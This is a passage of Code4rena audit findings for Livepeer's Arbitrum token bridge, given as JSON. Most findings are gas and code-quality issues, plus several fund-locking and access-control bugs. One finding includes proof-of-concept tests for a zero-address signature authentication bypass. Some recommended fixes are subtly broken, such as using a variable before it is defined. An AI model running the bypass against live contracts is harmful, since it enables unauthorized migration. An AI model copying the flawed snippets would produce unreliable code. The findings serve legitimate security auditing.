GatewayMessageHandler.encodeFromRouterToGateway(         msg.sender,         _data     );      emit TransferRouted(_token, msg.sender, _to, gateway);     return         ITokenGateway(gateway).outboundTransfer{ value: msg.value }(             _token,             _to,             _amount,             _maxGas,             _gasPriceBid,             gatewayData         ); } ```  However, `L2LPTGateway` dose not implement `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` but only `outboundTransfer(address,address,uint256,bytes)`:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTGateway.sol#L65-L89  ```solidity function outboundTransfer(     address _l1Token,     address _to,     uint256 _amount,     bytes calldata _data ) public override whenNotPaused returns (bytes memory res) {     // ... } ```  Therefore, the desired feature to withdraw LPT from L2 to L1 via Arbitrum Router will not be working properly.  ## Recommendation  Consider implementing the method used by  Arbitrum Router.  See also the implementation of L2DaiGateway by arbitrum-dai-bridge: https://github.com/makerdao/arbitrum-dai-bridge/blob/master/contracts/l2/L2DaiGateway.sol#L88-L95  "}, {"title": "The    initialize    function   does   not   check   for   non-zero   address and emit event", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/200", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The    initialize    function   does   not   check   if   the   `_bondingManager`   are   all   non-zero   addresses.   If   all  the   initialized   `_bondingManager`   happen   to   be   0,   the   contract   will   have   to   be redeployed.  The  contract are initialized, but their critical init parameters are not logged for any off-chain monitoring.  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L47-L51  ``` function initialize(address _bondingManager) public initializer {         bondingManager = _bondingManager;         migrator = msg.sender;         initialStake = pendingStake();     } ``` Most contracts use initialize() functions instead of constructor given the delegatecall proxy pattern. While most of them emit an event in the critical initialize() functions to record the init parameters for off-chain monitoring and transparency reasons, DelegatorPool.sol not emit such an event in their initialize() function.    ## Tools Used https://github.com/code-423n4/2021-06-pooltogether-findings/issues/68 ## Recommended Mitigation Steps Add check for zero address and emit event.  "}, {"title": "[WP-H3] `L1Migrator.sol#migrateETH()` Improper implementation of `L1Migrator` causing `migrateETH()` always reverts, can lead to ETH in `BridgeMinter` getting stuck in the contract", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/198", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L310  ```solidity uint256 amount = IBridgeMinter(bridgeMinterAddr)             .withdrawETHToL1Migrator(); ```  `L1Migrator.sol#migrateETH()` will call `IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator()` to withdraw ETH from `BridgeMinter`.  However, the current implementation of `L1Migrator` is unable to receive ETH.  https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L94-L94  ```solidity (bool ok, ) = l1MigratorAddr.call.value(address(this).balance)(\"\"); ```  A contract receiving Ether must have at least one of the functions below:  - `receive() external payable` - `fallback() external payable`  `receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.  Because `L1Migrator` implement neither `receive()` or `fallback()`, the `call` at L94 will always revert.  ## Impact  All the ETH held by the `BridgeMinter` can get stuck in the contract.  ## Recommandation  Add `receive() external payable {}` in `L1Migrator`.  "}, {"title": "Remove redundant `_setRoleAdmin()` can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/196", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L12-L16  ```solidity constructor() ERC20(\"Livepeer Token\", \"LPT\") ERC20Permit(\"Livepeer Token\") {     _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     _setRoleAdmin(MINTER_ROLE, DEFAULT_ADMIN_ROLE);     _setRoleAdmin(BURNER_ROLE, DEFAULT_ADMIN_ROLE); } ```  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L18-L24  ```solidity constructor(address _l1Lpt, address _l2Lpt) {     _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     _setRoleAdmin(GOVERNOR_ROLE, DEFAULT_ADMIN_ROLE);      l1Lpt = _l1Lpt;     l2Lpt = _l2Lpt; } ```  `constant DEFAULT_ADMIN_ROLE = 0x00`  By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`.  Therefore, `_setRoleAdmin(***_ROLE, DEFAULT_ADMIN_ROLE);` is redundant.  Removing it will make the code simpler and save some gas.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/783ac759a902a7b4a218c2d026a77e6a26b6c42d/contracts/access/AccessControl.sol#L40-L43  ```solidity  * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means  * that only accounts with this role will be able to grant or revoke other  * roles. More complex role relationships can be created by using  * {_setRoleAdmin}. ```  https://docs.openzeppelin.com/contracts/3.x/access-control#granting-and-revoking  > AccessControl includes a special role, called DEFAULT_ADMIN_ROLE, which acts as the ***default admin role for all roles***. An account with this role will be able to manage any other role, unless _setRoleAdmin is used to select a new admin role.  ### Recommendation  Remove the redundant code.  "}, {"title": "[WP-M1] `BURNER_ROLE` can burn any amount of L2LivepeerToken from an arbitrary address", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L36-L43  ```solidity function burn(address _from, uint256 _amount)     external     override     onlyRole(BURNER_ROLE) {     _burn(_from, _amount);     emit Burn(_from, _amount); } ```  Using the `burn()` function of `L2LivepeerToken`, an address with `BURNER_ROLE` can burn an arbitrary amount of tokens from any address.  We believe this is unnecessary and poses a serious centralization risk.  A malicious or compromised `BURNER_ROLE` address can take advantage of this, burn the balance of a Uniswap pool and effectively steal almost all the funds from the liquidity pool (eg, Uniswap LPT-WETH Pool).  ### Recommendation  Consider removing the `BURNER_ROLE` and change `burn()` function to:  ```solidity function burn(uint256 _amount)     external     override {     _burn(msg.sender, _amount);     emit Burn(msg.sender, _amount); } ```  https://github.com/livepeer/arbitrum-lpt-bridge/blob/49cf5401b0514511675d781a1e29d6b0325cfe88/contracts/L2/gateway/L2LPTGateway.sol#L34-L45  `Mintable(l2Lpt).burn(from, _amount);` in `L2LPTGateway.sol#outboundTransfer()` should also be replaced with:  ```solidity Mintable(l2Lpt).transferFrom(from, _amount); Mintable(l2Lpt).burn(_amount); ```  "}, {"title": "`DelegatorPool.sol#claim()` Inaccurate check of `claimedInitialStake < initialStake`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/190", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation of `DelegatorPool.sol#claim()`, it first requires `claimedInitialStake < initialStake`, or it throws an error of `DelegatorPool#claim: FULLY_CLAIMED`.  However, since it's an `onlyMigrator` function, the felicity of `_delegator` and `_stake` should be assured by the `Migrator` contract, otherwise, this `require` statement itself also can not prevent bad results caused by the wrong inputs.  Furthermore, even if the purpose of this `require` statement is to make sure that `claimedInitialStake` can never surpass the `initialStake`, the expression should be `claimedInitialStake + _stake <= initialStake` instead of `claimedInitialStake < initialStake`.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L58-L93  ```solidity function claim(address _delegator, uint256 _stake) external onlyMigrator {     require(         claimedInitialStake < initialStake,         \"DelegatorPool#claim: FULLY_CLAIMED\"     );      // Calculate stake owed to delegator     uint256 currTotalStake = pendingStake();     uint256 owedStake = (currTotalStake * _stake) /         (initialStake - claimedInitialStake);      // Calculate fees owed to delegator     uint256 currTotalFees = pendingFees();     uint256 owedFees = (currTotalFees * _stake) /         (initialStake - claimedInitialStake);      // update claimed balance     claimedInitialStake += _stake;      // Transfer owed stake to the delegator     transferBond(_delegator, owedStake);      // Transfer owed fees to the delegator     IBondingManager(bondingManager).withdrawFees(         payable(_delegator),         owedFees     );      emit Claimed(_delegator, owedStake, owedFees); } ```  ## Recommandation  Consider removing it or changing to:  ```solidity require(     claimedInitialStake + _stake <= initialStake,     \"DelegatorPool#claim: FULLY_CLAIMED\" ); ```  "}, {"title": "Save Gas With The Unchecked Keyword (L2LPTDataCache.sol)", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact Save Gas With The Unchecked Keyword (L2LPTDataCache.sol)  Redundant arithmetic underflow/overflow checks can be avoided when an underflow/overflow cannot happen.  ## Proof of Concept The \"unchecked\" keyword can be applied here since there is an `if` statement before to ensure the arithmetic operations would not cause an integer underflow or overflow.: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L57-L69  Change the code to:  ```     function decreaseL2SupplyFromL1(uint256 _amount) external onlyL2LPTGateway {         // If there is a mass withdrawal from L2, _amount could exceed l2SupplyFromL1.         // In this case, we just set l2SupplyFromL1 = 0 because there will be no more supply on L2         // that is from L1 and the excess (_amount - l2SupplyFromL1) is inflationary LPT that was         // never from L1 in the first place.         unchecked {             if (_amount > l2SupplyFromL1) {                 l2SupplyFromL1 = 0;             } else {                 l2SupplyFromL1 -= _amount;  // @audit unchecked             }         }          // No event because the L2LPTGateway events are sufficient     }   ```  A similar change can be made here: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L91-L94  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps Add the \"unchecked\" keyword as shown above.  "}, {"title": "Constant variables using keccak can be immutable", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact Changing the variables from constant to immutable will reduce keccak operations and save gas.  A previous finding with additional explanation and a pointer to the ethereum/solidity issue is here: https://github.com/code-423n4/2021-10-slingshot-findings/issues/3  ## Proof of Concept These variables can simply be changed from `constant` to `immutable`: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L114 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L116 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L121  Additional changes are needed for these variables since they are used in the constructor: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L111 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L59 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L9-L10 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13   Here's an example of the changes needed in the constructor for: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13  ``` contract ControlledGateway is AccessControl, Pausable {     bytes32 public immutable GOVERNOR_ROLE;        address public immutable l1Lpt;     address public immutable l2Lpt;      constructor(address _l1Lpt, address _l2Lpt) {         _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());         _setRoleAdmin(GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"), DEFAULT_ADMIN_ROLE);          l1Lpt = _l1Lpt;         l2Lpt = _l2Lpt;     }      function pause() external onlyRole(GOVERNOR_ROLE) {         _pause();     }      function unpause() external onlyRole(GOVERNOR_ROLE) {         _unpause();     } } ```  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps Change the constant variables to immutable as described in the POC.    "}, {"title": "Missing setter function for l2MigratorAddr", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/167", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  Based on the context, l2MigratorAddr should be able to be updated after deployment. However, there is no function to update it. On the L2Migrator.sol, l1MigratorAddr can be updated. (https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L101)   ## Proof of Concept  1. Navigate to the following contract variable.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L141  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Consider to define function for setting l2MigratorAddr.  "}, {"title": "L2LPTGateway descriptions to be corrected", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/157", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  hyh   # Vulnerability details  ## Proof of Concept  In L2LPTGateway contract description the @title is L1LPTGateway  In L2LPTGateway.outboundTransfer function's description there is '@param _data Contains sender and additional data to send to L1' line, while actually function allows no additional data  "}, {"title": "DelegatorPool.claim subtraction can be unchecked and done once", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on calculations and checks  ## Proof of Concept  (initialStake - claimedInitialStake) figure is calculated after require check, so the subtraction itself can be unchecked. Also, it is done twice now, can save the result to memory and use it.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L2/pool/DelegatorPool.sol#L73  ## Recommended Mitigation Steps  Consider calculating (initialStake - claimedInitialStake) one time and in unchecked scope.  "}, {"title": "Gas: `L2LPTDataCache.sol:l1CirculatingSupply()`, Storage variables should be cached", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `L2LPTDataCache.sol:l1CirculatingSupply()`, the code is as follows: ``` File: L2LPTDataCache.sol 88:     function l1CirculatingSupply() public view returns (uint256) { 89:         // After the first update from L1, l1TotalSupply should always be >= l2SupplyFromL1 90:         // The below check is defensive to avoid reverting if this invariant for some reason violated 91:         return 92:             l1TotalSupply >= l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; 95:     } ```  I suspect that statistically, the arithmetic operation `l1TotalSupply - l2SupplyFromL1` should often be triggered. Therefore, caching the 2 variables `l1TotalSupply` and `l2SupplyFromL1` in memory variables would save the 2 SLOADs (~200 gas) in the substraction and cost 4 MLOADs (~12 gas) and 2 MSTOREs (6 gas).  It can be done this way, as an example: `(uint256 _l1TotalSupply, uint256 _l2SupplyFromL1) = (l1TotalSupply, l2SupplyFromL1);`  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache `l1TotalSupply` and `l2SupplyFromL1` in local variables  "}, {"title": "Gas: `L2LPTDataCache.sol:l1CirculatingSupply()`, strict comparison can avoid expensive operation", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (2 SLOADs and 1 SUB are avoided with the suggested solution)  ## Proof of Concept In `L2LPTDataCache.sol:l1CirculatingSupply()`, the code is as such: ``` File: L2LPTDataCache.sol 88:     function l1CirculatingSupply() public view returns (uint256) { 89:         // After the first update from L1, l1TotalSupply should always be >= l2SupplyFromL1 90:         // The below check is defensive to avoid reverting if this invariant for some reason violated 91:         return 92:             l1TotalSupply >= l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; 95:     }  ```  Here, in the case of `l1TotalSupply == l2SupplyFromL1`, the substraction is equal to 0, but the computation is still done instead of return the already present 0 value. This could be avoided by making a strict comparison: ``` File: L2LPTDataCache.sol 91:         return 92:             l1TotalSupply > l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use `>` instead of `>=`  "}, {"title": "Gas: `DelegatorPool.sol:claim()`, a repetitive arithmetic operation should be cached", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/146", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (2 SLOADs and 1 SUB vs 1 MSTORE and 2 MLOADs)  ## Proof of Concept In `DelegatorPool.sol:claim()`, the following calculation is done twice :  ``` (X * _stake) / (initialStake - claimedInitialStake);  where X is either currTotalStake or currTotalFees ```  While I understand a loss of precision could occur by caching the whole calculation, it's possible to save some gas (here, 2 SLOADs and 1 SUB) by caching the result of the denominator's substraction in a variable (`initialStake - claimedInitialStake`) and using this instead of computing the substraction twice.  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "Signature authentication bypass for ZERO address", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/142", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  kemmio   # Vulnerability details  ## Impact Vulnerability in requireValidMigration() function gives opportunity to authenticate on behalf of ZERO address (l1addr == ZERO) and migrate locked up bonds, delegators, sender  ## Proof of Concept  L1Migrator contract's functions migrateDelegator(), migrateUnbondingLocks(), migrateSender() use requireValidMigration() to authenticate the migration request, as can be seen in: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L164-L173 https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L214-L228 https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L267-L274  requireValidMigration() checks if l2addr=ZERO and reverts in that's the case: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L506-L509  Next it checks wether msg.sender==l1addr or tries to authenticate with signature otherwise: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L510-L514  It calls recoverSigner() for that purpose which calls ECDS.recover to recover signing address, but before that it checks if signature is empty and returns address(0): https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524  This functionality can be abused to bypass authentication for ZERO address  Proof of Concept: (add this tests to ./test/unit/L1/l1Migrator.test.ts and run \"yarn test test/unit/L1/l1Migrator.test.ts\" ) ```       it('migrates delegator for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateDelegator('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {               value: ethers.utils.parseEther('1'),             });         await expect(tx).to.emit(l1Migrator,'MigrateDelegatorInitiated');       });       it('migrates unbonding locks for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateUnbondingLocks(                 '0x0000000000000000000000000000000000000000',                 l1EOA.address,                 [],                 '0x',                 0,                 0,                 0,                 {                   value: ethers.utils.parseEther('1'),                 },             );         await expect(tx).to.emit(l1Migrator,'MigrateUnbondingLocksInitiated');       });       it('migrates sender for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateSender('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {               value: ethers.utils.parseEther('1'),             });         await expect(tx).to.emit(l1Migrator,'MigrateSenderInitiated');       }); ```  ## Tools Used  ## Recommended Mitigation Steps Remove these lines: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524  "}, {"title": "Gas: Missing checks for non-zero transfer value calls", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking non-zero transfer values can avoid an external call to save gas.  ## Proof of Concept Instances missing a non-zero check: ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1LPTGateway.sol:100:            TokenLike(_l1Token).transferFrom(from, l1LPTEscrow, _amount); arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1LPTGateway.sol:150:            TokenLike(l1Token).transferFrom(l1LPTEscrow, to, amount); protocol\\contracts\\token\\BridgeMinter.sol:79:        token.transfer(_newMinterAddr, token.balanceOf(address(this))); protocol\\contracts\\token\\BridgeMinter.sol:109:        token.transfer(l1MigratorAddr, balance);  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Check if transfer amount > 0 before executing the transfer  "}, {"title": "Missing `_from` param comment on `LivepeerToken.sol:burn()`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/140", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The `_from` parameter comment is missing on `LivepeerToken.sol:burn()`. The impact is minimal, but as it's commented elsewhere (https://github.com/livepeer/arbitrum-lpt-bridge/blob/af952a58eff5ff84559e25f62e29f2a3d9e176f9/contracts/L2/gateway/L2LPTGateway.sol#L96), I figured I'd mention it.  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/e89be1431024d976b8c97bbe64ec4bdfeb28ec64/contracts/L2/token/LivepeerToken.sol#L32-L36 ``` File: LivepeerToken.sol 32:     /** 33:      * @dev Burns a specific amount of the sender's tokens 34:      * @param _amount The amount of tokens to be burned 35:      */ 36:     function burn(address _from, uint256 _amount) 37:         external 38:         override 39:         onlyRole(BURNER_ROLE) 40:     { 41:         _burn(_from, _amount); 42:         emit Burn(_from, _amount); 43:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Add the missing comment  "}, {"title": "Gas: Control flow optimization in `L2LPTDataCache.sol:decreaseL2SupplyFromL1()`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `L2LPTDataCache.sol:decreaseL2SupplyFromL1()`, the code is as follows:  ``` File: L2LPTDataCache.sol 57:     function decreaseL2SupplyFromL1(uint256 _amount) external onlyL2LPTGateway { 58:         // If there is a mass withdrawal from L2, _amount could exceed l2SupplyFromL1. 59:         // In this case, we just set l2SupplyFromL1 = 0 because there will be no more supply on L2 60:         // that is from L1 and the excess (_amount - l2SupplyFromL1) is inflationary LPT that was 61:         // never from L1 in the first place. 62:         if (_amount > l2SupplyFromL1) {  63:             l2SupplyFromL1 = 0; 64:         } else { 65:             l2SupplyFromL1 -= _amount; 66:         } 67:  68:         // No event because the L2LPTGateway events are sufficient 69:     } ```  However, this can be optimized : - Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO) - In this case here, if `_amount == l2SupplyFromL1`, `0` should be returned - Avoiding the else clause would avoid some opcodes (1 SUB,  1 SLOAD, 1 MLOAD)  The code would become:  ```         if (_amount >= l2SupplyFromL1) {             l2SupplyFromL1 = 0;         } else {             l2SupplyFromL1 -= _amount;         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use the non-strict greater-than operator in this particular case  "}, {"title": "Avoiding unnecessary repeated account balance read can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L90-L98  ```solidity function withdrawETHToL1Migrator() external onlyL1Migrator returns (uint256) {     uint256 balance = address(this).balance;      // call() should be safe from re-entrancy here because the L1Migrator and l1MigratorAddr are trusted     (bool ok, ) = l1MigratorAddr.call.value(address(this).balance)(\"\");     require(ok, \"BridgeMinter#withdrawETHToL1Migrator: FAIL_CALL\");      return balance; } ```  At L94, `address(this).balance` can be replaced with `balance` to avoid unnecessarily repeated read of account balance state to save some gas.   "}, {"title": "`DelegatorPool.sol#claim()` Use inline expression can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L70-L78  ```solidity         // Calculate stake owed to delegator         uint256 currTotalStake = pendingStake();         uint256 owedStake = (currTotalStake * _stake) /             (initialStake - claimedInitialStake);          // Calculate fees owed to delegator         uint256 currTotalFees = pendingFees();         uint256 owedFees = (currTotalFees * _stake) /             (initialStake - claimedInitialStake); ```  The local variable `currTotalStake`, `currTotalFees` is used only once. Making the expression inline can save gas.  Similar issue exists in `L2Migrator.sol#claimStake()`, `L1Migrator.sol#migrateETH()`, `L1Migrator.sol#migrateLPT()`, `L1ArbitrumMessenger.sol#onlyL2Counterpart()`.  ### Recommendation  Change to:  ```solidity         // Calculate stake owed to delegator         uint256 owedStake = (pendingStake() * _stake) /             (initialStake - claimedInitialStake);          // Calculate fees owed to delegator         uint256 owedFees = (pendingFees() * _stake) /             (initialStake - claimedInitialStake); ```   "}, {"title": "Check of `!migratedDelegators[delegator]` can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  When there are multiple checks, adjusting the sequence to allow the tx to fail earlier can save some gas.  Checks using less gas should be executed earlier than those with higher gas costs, to avoid unnecessary storage read, arithmetic operations, etc when it reverts.  For example:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L255-L275  ```solidity         require(             claimStakeEnabled,             \"L2Migrator#claimStake: CLAIM_STAKE_DISABLED\"         );          IMerkleSnapshot merkleSnapshot = IMerkleSnapshot(merkleSnapshotAddr);          address delegator = msg.sender;         bytes32 leaf = keccak256(             abi.encodePacked(delegator, _delegate, _stake, _fees)         );          require(             merkleSnapshot.verify(keccak256(\"LIP-73\"), _proof, leaf),             \"L2Migrator#claimStake: INVALID_PROOF\"         );          require(             !migratedDelegators[delegator],             \"L2Migrator#claimStake: ALREADY_MIGRATED\"         ); ```  The check of `!migratedDelegators[delegator]` can be done earlier to avoid reading from storage when `migratedDelegators[delegator] == true`.  ## Recommendation  Change to:  ```solidity         require(             claimStakeEnabled,             \"L2Migrator#claimStake: CLAIM_STAKE_DISABLED\"         );          address delegator = msg.sender;         require(             !migratedDelegators[delegator],             \"L2Migrator#claimStake: ALREADY_MIGRATED\"         );          IMerkleSnapshot merkleSnapshot = IMerkleSnapshot(merkleSnapshotAddr);         require(             merkleSnapshot.verify(keccak256(\"LIP-73\"), _proof, leaf),             \"L2Migrator#claimStake: INVALID_PROOF\"         );          bytes32 leaf = keccak256(             abi.encodePacked(delegator, _delegate, _stake, _fees)         ); ```  "}, {"title": "Setting `uint256` variables to `0` is redundant", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L471-L471  ```solidity uint256 total = 0; ```  